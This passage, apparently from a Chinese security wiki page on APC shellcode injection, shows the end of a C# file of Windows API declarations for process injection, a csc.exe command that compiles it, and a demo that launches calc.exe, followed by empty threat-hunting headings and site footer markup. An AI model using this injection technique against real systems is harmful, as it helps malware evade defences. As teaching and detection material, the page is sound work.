class="line">              SUSPEND_RESUME      = (0x0002)  ,</span><br><span class="line">              GET_CONTEXT         = (0x0008)  ,</span><br><span class="line">              SET_CONTEXT         = (0x0010)  ,</span><br><span class="line">              SET_INFORMATION     = (0x0020)  ,</span><br><span class="line">              QUERY_INFORMATION       = (0x0040)  ,</span><br><span class="line">              SET_THREAD_TOKEN    = (0x0080)  ,</span><br><span class="line">              IMPERSONATE         = (0x0100)  ,</span><br><span class="line">              DIRECT_IMPERSONATION    = (0x0200)</span><br><span class="line">       &#125;</span><br><span class="line">       </span><br><span class="line">       [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]</span><br><span class="line">       public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle,</span><br><span class="line">              int dwThreadId);</span><br><span class="line">       </span><br><span class="line">       [DllImport(&quot;kernel32.dll&quot;,SetLastError = true)]</span><br><span class="line">       public static extern bool WriteProcessMemory(</span><br><span class="line">              IntPtr hProcess,</span><br><span class="line">              IntPtr lpBaseAddress,</span><br><span class="line">              byte[] lpBuffer,</span><br><span class="line">              int nSize,</span><br><span class="line">              out IntPtr lpNumberOfBytesWritten);</span><br><span class="line">       </span><br><span class="line">       [DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">       public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);</span><br><span class="line">       </span><br><span class="line">       [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">       public static extern IntPtr VirtualAlloc(UInt32 lpStartAddr,</span><br><span class="line">               Int32 size, UInt32 flAllocationType, UInt32 flProtect);</span><br><span class="line">       [DllImport(&quot;kernel32.dll&quot;, SetLastError = true )]</span><br><span class="line">       public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,</span><br><span class="line">       Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);</span><br><span class="line">       </span><br><span class="line">       [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]</span><br><span class="line">       public static extern IntPtr OpenProcess(</span><br><span class="line">        ProcessAccessFlags processAccess,</span><br><span class="line">        bool bInheritHandle,</span><br><span class="line">        int processId</span><br><span class="line">       );</span><br><span class="line">       </span><br><span class="line">       </span><br><span class="line">       [DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">       public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,bool bInheritHandles, ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment,string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);</span><br><span class="line">       [DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">       public static extern uint ResumeThread(IntPtr hThread);</span><br><span class="line">       [DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">       public static extern uint SuspendThread(IntPtr hThread);</span><br><span class="line">       [DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">       public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,</span><br><span class="line">       int dwSize, uint flNewProtect, out uint lpflOldProtect);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>用csc.exe直接编译为exe文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe /reference:&quot;System.Runtime.dll&quot; /target:exe APCInject.cs</span><br></pre></td></tr></table></figure>
+
+<p>执行APCinject.exe，执行notepad.exe，弹出计算器calc.exe</p>
+<p><img src="/wiki/5.%20%E9%AB%98%E7%BA%A7%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Defense%20Evasion/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/Shellcode-APC%E6%B3%A8%E5%85%A5%E5%92%8C%E5%8A%A0%E8%BD%BD/2.png"></p>
+<h2 id="Threat-Hunting"><a href="#Threat-Hunting" class="headerlink" title="Threat Hunting"></a>Threat Hunting</h2><h3 id="Process-and-Memory-Analysis"><a href="#Process-and-Memory-Analysis" class="headerlink" title="Process and Memory Analysis"></a>Process and Memory Analysis</h3><h3 id="Log-Analysis"><a href="#Log-Analysis" class="headerlink" title="Log Analysis"></a>Log Analysis</h3><h3 id="Network-Traffic-Analysis"><a href="#Network-Traffic-Analysis" class="headerlink" title="Network Traffic Analysis"></a>Network Traffic Analysis</h3><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><blockquote>
+<ul>
+<li><a href></a></li>
+<li><a href></a></li>
+</ul>
+</blockquote>
+
+            </div>
+        
+        <footer class="article-footer">
+        </footer>
+    </div>
+</article>
+
+
+    
+<nav id="article-nav">
+    
+        <a href="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/PowerShell%E5%9F%BA%E7%A1%80/" id="article-nav-newer" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">Newer</strong>
+            <div class="article-nav-title">
+                
+                    PowerShell基础
+                
+            </div>
+        </a>
+    
+    
+        <a href="/wiki/3.%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" id="article-nav-older" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">Older</strong>
+            <div class="article-nav-title">Linux应急响应</div>
+        </a>
+    
+</nav>
+
+
+
+
+
+    
+    
+
+
+
+
+<!-- baidu url auto push script -->
+<script type="text/javascript">
+    !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=window.location.href,o=document.referrer;if(!e.test(r)){var n="//api.share.baidu.com/s.gif";o?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var t=new Image;t.src=n}}(window);
+</script>     
+</section>
+        </div>
+        <footer id="footer">
+    <div class="outer">
+        <div id="footer-info" class="inner">
+            Tahir &copy; 2021 
+            <a rel="external nofollow noopener noreferrer" target="_blank" href="http://creativecommons.org/licenses/by-nc-nd/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-nd/4.0/80x15.png"></a>
+            <br> Powered by <a href="http://hexo.io/" target="_blank" rel="external nofollow noopener noreferrer">Hexo</a>. Theme - <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/zthxxx/hexo-theme-Wikitten">wikitten</a>
+            
+                <br>
+                <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i> <span id="busuanzi_value_site_pv"></span></span>
+                &nbsp;|&nbsp;
+                <span id="busuanzi_container_site_pv"><i class="fa fa-user"></i> <span id="busuanzi_value_site_uv"></span></span>
+            
+        </div>
+    </div>
+</footer>
+        
+
+    
+        
+<script src="/libs/lightgallery/js/lightgallery.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-pager.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-hash.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-share.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-video.min.js"></script>
+
+    
+    
+        
+<script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+    
+    
+        <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true,
+            TeX: {
+                equationNumbers: {
+                  autoNumber: 'AMS'
+                }
+            }
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script async src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    
+
+
+
+<!-- Custom Scripts -->
+
+<script src="/js/main.js"></script>
+
+
+    </div>
+</body>
+</html>
